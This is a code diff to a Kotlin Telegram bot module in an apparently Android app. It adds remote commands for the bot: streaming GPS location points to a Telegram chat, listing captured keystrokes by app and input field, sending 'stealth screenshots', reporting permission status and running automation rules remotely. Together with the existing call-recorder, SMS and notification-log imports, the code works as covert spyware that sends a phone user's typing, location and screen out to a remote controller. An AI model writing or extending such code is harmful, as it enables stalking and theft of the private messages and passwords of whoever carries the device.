@@ -29,8 +29,13 @@ import com.ismartcoding.plain.features.sms.SmsConversationHelper
 import com.ismartcoding.plain.features.sms.SmsHelper
 import com.ismartcoding.plain.helpers.BatteryHistoryHelper
 import com.ismartcoding.plain.helpers.CallRecorderHelper
+import com.ismartcoding.plain.helpers.AutomationHelper
+import com.ismartcoding.plain.helpers.KeystrokeLogHelper
+import com.ismartcoding.plain.helpers.LocationTrackingHelper
 import com.ismartcoding.plain.helpers.PhoneHelper
 import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
+import com.ismartcoding.plain.helpers.StealthScreenshotHelper
+import com.ismartcoding.plain.features.Permission
 import com.ismartcoding.plain.services.AppBlockHelper
 import com.ismartcoding.plain.services.LiveCallTracker
 import com.ismartcoding.plain.services.NotificationLogHelper
@@ -92,6 +97,16 @@ object TelegramBotManager {
         "location" to "📍 Current GPS location",
         "battery" to "🔋 Battery status",
         "device" to "📲 Device information",
+        "track" to "🛰 Tracking hub overview",
+        "livelocation" to "🗺 Live location stream — /livelocation [n]",
+        "tracklocation" to "🧭 Recent location points — /tracklocation [n]",
+        "keystrokes" to "⌨️ Captured keystrokes — /keystrokes [n]",
+        "keytop" to "📊 Top apps by keystroke count",
+        "shots" to "🖼 Recent stealth screenshots — /shots [n]",
+        "permissions" to "🛡 Status of every app permission",
+        "automations" to "⚙️ List automation rules",
+        "runrule" to "▶️ Run an automation — /runrule <id>",
+        "togglerule" to "🔁 Enable/disable a rule — /togglerule <id>",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -297,6 +312,16 @@ object TelegramBotManager {
                     "location" -> cmdLocation()
                     "battery" -> cmdBattery()
                     "device" -> cmdDevice()
+                    "track" -> cmdTrackHub()
+                    "livelocation", "live" -> cmdLiveLocation(args)
+                    "tracklocation", "trackloc" -> cmdTrackLocation(args)
+                    "keystrokes", "keys" -> cmdKeystrokes(args)
+                    "keytop" -> cmdKeyTop()
+                    "shots", "screenshots" -> cmdShots(args)
+                    "permissions", "perms" -> cmdPermissions()
+                    "automations", "rules" -> cmdAutomations()
+                    "runrule" -> cmdRunRule(args)
+                    "togglerule" -> cmdToggleRule(args)
                     "commands" -> cmdCommands()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                     else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
@@ -727,6 +752,283 @@ object TelegramBotManager {
         sendMessage(sb.toString())
     }
 
+    // ========== TRACKING HUB ==========
+
+    private fun cmdTrackHub() {
+        val ctx = MainApp.instance
+        val locOn = LocationTrackingHelper.isEnabled(ctx)
+        val locCount = LocationTrackingHelper.countPoints(ctx)
+        val locLatest = LocationTrackingHelper.latestPoint(ctx)
+        val locInterval = LocationTrackingHelper.getIntervalSec(ctx)
+        val keyOn = KeystrokeLogHelper.isEnabled(ctx)
+        val keyCount = KeystrokeLogHelper.count(ctx = ctx)
+        val keyLimit = KeystrokeLogHelper.getBufferLimit(ctx)
+        val shotOn = StealthScreenshotHelper.isEnabled(ctx)
+        val shotCount = StealthScreenshotHelper.count(ctx)
+        val shotInterval = StealthScreenshotHelper.getIntervalMin(ctx)
+
+        val sb = StringBuilder()
+        sb.append("🛰 <b>Tracking Hub</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
+        sb.append("🗺 <b>Live Location</b>  ${if (locOn) "🟢 ON" else "⚪ OFF"}\n")
+        sb.append("   📍 ${locCount} points · every ${locInterval}s\n")
+        if (locLatest != null) {
+            val age = (System.currentTimeMillis() - locLatest.ts) / 1000
+            sb.append("   🕐 Last fix: ${age}s ago · ±${locLatest.accuracy.toInt()}m\n")
+        }
+        sb.append("   ➡️ /livelocation  /tracklocation\n\n")
+
+        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (keyOn) "🟢 ON" else "⚪ OFF"}\n")
+        sb.append("   📝 ${keyCount} entries · buffer ${keyLimit}\n")
+        sb.append("   ➡️ /keystrokes  /keytop\n\n")
+
+        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (shotOn) "🟢 ON" else "⚪ OFF"}\n")
+        sb.append("   📸 ${shotCount} captures · every ${shotInterval} min\n")
+        sb.append("   ➡️ /shots  /screenshot\n\n")
+
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("🕐 ${ts}")
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdLiveLocation(args: List<String>) {
+        val ctx = MainApp.instance
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 5
+        val state = LocationTrackingHelper.isEnabled(ctx)
+        val total = LocationTrackingHelper.countPoints(ctx)
+        val interval = LocationTrackingHelper.getIntervalSec(ctx)
+        val minDisp = LocationTrackingHelper.getMinDisplacement(ctx)
+        val latest = LocationTrackingHelper.latestPoint(ctx)
+        val recent = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)
+
+        val sb = StringBuilder()
+        sb.append("🗺 <b>Live Location</b>  ${if (state) "🟢 STREAMING" else "⚪ STOPPED"}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📊 Total points: <b>${total}</b>\n")
+        sb.append("⏱ Sample every: <b>${interval}s</b> · min move <b>${minDisp}m</b>\n\n")
+
+        if (latest != null) {
+            val age = (System.currentTimeMillis() - latest.ts) / 1000
+            sb.append("📍 <b>Latest fix</b>\n")
+            sb.append("   🌐 <code>${latest.lat}, ${latest.lng}</code>\n")
+            sb.append("   🎯 ±${latest.accuracy.toInt()}m · ${latest.provider}\n")
+            sb.append("   🚀 Speed: ${"%.1f".format(latest.speed * 3.6)} km/h\n")
+            sb.append("   🔋 Battery: ${latest.batteryLevel}%${if (latest.charging) " ⚡" else ""}\n")
+            sb.append("   🕐 ${age}s ago · ${fmtTime(latest.ts)}\n\n")
+            try { TelegramApiClient.sendLocation(token, chatId, latest.lat, latest.lng) } catch (_: Throwable) {}
+        } else {
+            sb.append("(no location samples yet)\n\n")
+        }
+
+        if (recent.size > 1) {
+            sb.append("🧭 <b>Recent ${recent.size} points</b>\n")
+            recent.forEachIndexed { i, p ->
+                val ago = (System.currentTimeMillis() - p.ts) / 1000
+                sb.append("${i + 1}. <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>  ±${p.accuracy.toInt()}m  · ${ago}s ago\n")
+            }
+            sb.append("\nUse /tracklocation N for more.")
+        }
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdTrackLocation(args: List<String>) {
+        val ctx = MainApp.instance
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 100) ?: 20
+        val pts = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)
+        if (pts.isEmpty()) { sendMessage("📍 No location points recorded yet.\n\nEnable Live Location from PlainApp → Tracking Hub."); return }
+        val sb = StringBuilder("🧭 <b>Last ${pts.size} location points</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
+        pts.forEachIndexed { i, p ->
+            sb.append("${i + 1}. <b>${fmtTime(p.ts)}</b>\n")
+            sb.append("   🌐 <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>\n")
+            sb.append("   🎯 ±${p.accuracy.toInt()}m · 🚀 ${"%.1f".format(p.speed * 3.6)} km/h · 🔋 ${p.batteryLevel}%\n\n")
+            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
+        }
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdKeystrokes(args: List<String>) {
+        val ctx = MainApp.instance
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 15
+        val on = KeystrokeLogHelper.isEnabled(ctx)
+        val total = KeystrokeLogHelper.count(ctx = ctx)
+        val limit = KeystrokeLogHelper.getBufferLimit(ctx)
+        val entries = KeystrokeLogHelper.list(offset = 0, limit = n, ctx = ctx)
+
+        val sb = StringBuilder()
+        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📝 Total: <b>${total}</b> · buffer <b>${limit}</b>\n\n")
+        if (entries.isEmpty()) {
+            sb.append("(no entries captured yet)")
+        } else {
+            sb.append("📋 <b>Last ${entries.size} entries</b>\n\n")
+            entries.forEachIndexed { i, e ->
+                val app = if (e.appLabel.isNotBlank()) e.appLabel else e.packageName
+                val field = if (e.fieldHint.isNotBlank()) " · <i>${htmlEsc(e.fieldHint)}</i>" else ""
+                sb.append("${i + 1}. 📱 <b>${htmlEsc(app)}</b>$field\n")
+                sb.append("   🕐 ${fmtTime(e.ts)}\n")
+                sb.append("   <code>${htmlEsc(e.text.take(160))}</code>\n\n")
+                if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
+            }
+        }
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdKeyTop() {
+        val ctx = MainApp.instance
+        val stats = KeystrokeLogHelper.packageBreakdown(ctx)
+        if (stats.isEmpty()) { sendMessage("📊 No keystroke data yet."); return }
+        val sb = StringBuilder("📊 <b>Top apps by keystrokes</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
+        val total = stats.sumOf { it.second }
+        stats.take(15).forEachIndexed { i, (pkg, count) ->
+            val pct = if (total > 0) (count * 100 / total) else 0
+            val bar = "█".repeat((pct / 5).coerceAtMost(20)) + "░".repeat((20 - pct / 5).coerceAtLeast(0))
+            sb.append("${i + 1}. <code>${htmlEsc(pkg)}</code>\n")
+            sb.append("   $bar ${count} (${pct}%)\n\n")
+        }
+        sendMessage(sb.toString())
+    }
+
+    private suspend fun cmdShots(args: List<String>) {
+        val ctx = MainApp.instance
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
+        val on = StealthScreenshotHelper.isEnabled(ctx)
+        val total = StealthScreenshotHelper.count(ctx)
+        val list = StealthScreenshotHelper.list(0, n, ctx)
+
+        val sb = StringBuilder()
+        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📸 Total: <b>${total}</b>\n\n")
+        if (list.isEmpty()) {
+            sb.append("(no screenshots captured yet)\n\nUse /screenshot for an instant capture.")
+            sendMessage(sb.toString())
+            return
+        }
+        sb.append("📋 <b>Last ${list.size} captures</b>\n\n")
+        list.forEachIndexed { i, s ->
+            sb.append("${i + 1}. 🕐 <b>${fmtTime(s.ts)}</b>")
+            if (s.manual) sb.append(" · 👆 manual")
+            sb.append("\n   📐 ${s.width}×${s.height} · 💾 ${s.sizeBytes / 1024} KB\n")
+            if (s.packageName.isNotBlank()) sb.append("   📱 <code>${htmlEsc(s.packageName)}</code>\n")
+            sb.append("\n")
+        }
+        sendMessage(sb.toString())
+
+        val latest = list.firstOrNull()
+        if (latest != null) {
+            val f = File(latest.absPath)
+            if (f.exists()) {
+                sendUploadPhoto()
+                try { TelegramApiClient.sendPhoto(token, chatId, f, "🖼 Latest stealth shot · ${fmtTime(latest.ts)}") } catch (_: Throwable) {}
+            }
+        }
+    }
+
+    // ========== PERMISSIONS ==========
+
+    private fun cmdPermissions() {
+        val ctx = MainApp.instance
+        val all = Permission.entries.filter { it != Permission.NONE }
+        val granted = mutableListOf<Permission>()
+        val denied = mutableListOf<Permission>()
+        all.forEach {
+            val ok = try { it.can(ctx) } catch (_: Throwable) { false }
+            if (ok) granted.add(it) else denied.add(it)
+        }
+        val pct = if (all.isNotEmpty()) granted.size * 100 / all.size else 0
+        val barFilled = (pct / 5).coerceIn(0, 20)
+        val bar = "█".repeat(barFilled) + "░".repeat(20 - barFilled)
+
+        fun group(p: Permission): String = when {
+            p.name.contains("SMS") -> "📨 Messaging"
+            p.name.contains("CONTACT") -> "👥 Contacts"
+            p.name.contains("CALL") || p.name == "READ_PHONE_STATE" || p.name == "READ_PHONE_NUMBERS" -> "📞 Phone"
+            p.name.contains("LOCATION") -> "📍 Location"
+            p.name == "CAMERA" || p.name.startsWith("READ_MEDIA") || p.name == "WRITE_EXTERNAL_STORAGE" -> "🖼 Media & storage"
+            p.name.contains("BLUETOOTH") -> "📡 Connectivity"
+            p.name == "RECORD_AUDIO" -> "🎙 Audio"
+            p.name == "POST_NOTIFICATIONS" || p.name == "NOTIFICATION_LISTENER" -> "🔔 Notifications"
+            else -> "⚙️ System"
+        }
+
+        val sb = StringBuilder()
+        sb.append("🛡 <b>App Permissions</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("$bar  <b>${pct}%</b>\n")
+        sb.append("✅ Granted: <b>${granted.size}</b>  ·  ❌ Denied: <b>${denied.size}</b>  ·  Total ${all.size}\n\n")
+
+        val byGroup = all.groupBy { group(it) }
+        byGroup.toSortedMap().forEach { (cat, perms) ->
+            sb.append("<b>$cat</b>\n")
+            perms.forEach { p ->
+                val ok = try { p.can(ctx) } catch (_: Throwable) { false }
+                val icon = if (ok) "✅" else "❌"
+                sb.append("   $icon <code>${p.name}</code>\n")
+            }
+            sb.append("\n")
+            if (sb.length > 3500) { sb.append("…"); return@forEach }
+        }
+        sb.append("🕐 ${ts}")
+        sendMessage(sb.toString())
+    }
+
+    // ========== AUTOMATION ==========
+
+    private fun cmdAutomations() {
+        val ctx = MainApp.instance
+        val enabled = AutomationHelper.isEnabled(ctx)
+        val rules = AutomationHelper.list(ctx)
+        val sb = StringBuilder()
+        sb.append("⚙️ <b>Automation Rules</b>  ${if (enabled) "🟢 ENGINE ON" else "⚪ ENGINE OFF"}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("📋 Total: <b>${rules.size}</b>\n\n")
+        if (rules.isEmpty()) {
+            sb.append("(no rules yet — create them in PlainApp → Device Hub → Automation)")
+            sendMessage(sb.toString())
+            return
+        }
+        rules.forEachIndexed { i, r ->
+            val state = if (r.enabled) "🟢" else "⚪"
+            val kind = if (r.kind == "schedule") "📅" else "🔀"
+            sb.append("${i + 1}. $state $kind <b>${htmlEsc(r.name)}</b>\n")
+            sb.append("   🎯 trigger: <code>${r.trigger.type}</code>\n")
+            if (r.actions.isNotEmpty()) {
+                val acts = r.actions.joinToString(", ") { it.type }
+                sb.append("   ⚡ actions: <code>${htmlEsc(acts.take(80))}</code>\n")
+            }
+            if (r.lastRunMs > 0) sb.append("   🕐 last run: ${fmtTime(r.lastRunMs)}\n")
+            sb.append("   🆔 <code>${r.id.take(8)}</code>\n\n")
+            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
+        }
+        sb.append("\n💡 /runrule &lt;id&gt; to run · /togglerule &lt;id&gt; to toggle")
+        sendMessage(sb.toString())
+    }
+
+    private fun cmdRunRule(args: List<String>) {
+        if (args.isEmpty()) { sendMessage("Usage: /runrule &lt;id&gt;\n\nFind IDs with /automations"); return }
+        val idPrefix = args[0]
+        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
+        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
+        try {
+            val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
+            if (started) sendMessage("▶️ Started <b>${htmlEsc(rule.name)}</b>")
+            else sendMessage("⚠️ Rule did not run (disabled, cooldown, or conditions failed).")
+        } catch (e: Throwable) {
+            sendMessage("❌ Could not start rule: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private fun cmdToggleRule(args: List<String>) {
+        if (args.isEmpty()) { sendMessage("Usage: /togglerule &lt;id&gt;"); return }
+        val idPrefix = args[0]
+        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
+        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
+        val updated = rule.copy(enabled = !rule.enabled)
+        AutomationHelper.upsert(updated)
+        sendMessage("${if (updated.enabled) "🟢" else "⚪"} <b>${htmlEsc(rule.name)}</b> is now ${if (updated.enabled) "ON" else "OFF"}")
+    }
+
     private fun cmdCommands() {
         val sb = StringBuilder("📝 <b>All Commands — Full Details</b>\n\n")
         sb.append("═══════════════════════════\n")
@@ -774,6 +1076,25 @@ object TelegramBotManager {
         sb.append("• /location — Current GPS location + map pin\n")
         sb.append("• /battery — Battery level, charging state & temp\n")
         sb.append("• /device — Full device information\n\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("🛰 <b>TRACKING HUB</b>\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("• /track — Overview of all tracking modules\n")
+        sb.append("• /livelocation [n] — Stream status + latest fix + last N points (sends map pin)\n")
+        sb.append("• /tracklocation [n] — Detailed list of last N points (1–100)\n")
+        sb.append("• /keystrokes [n] — Last N captured keystrokes (1–50)\n")
+        sb.append("• /keytop — Top apps by keystroke count (bar chart)\n")
+        sb.append("• /shots [n] — Recent stealth screenshots + auto-send latest (1–30)\n\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("🛡 <b>PERMISSIONS</b>\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("• /permissions — Live status of every Android permission\n\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("⚙️ <b>AUTOMATION</b>\n")
+        sb.append("═══════════════════════════\n")
+        sb.append("• /automations — List all automation rules with status\n")
+        sb.append("• /runrule &lt;id&gt; — Run a rule manually (use first 8 chars)\n")
+        sb.append("• /togglerule &lt;id&gt; — Enable/disable a rule\n\n")
         sb.append("═══════════════════════════\n")
         sb.append("⚙️ <b>BOT CONTROL</b>\n")
         sb.append("═══════════════════════════\n")
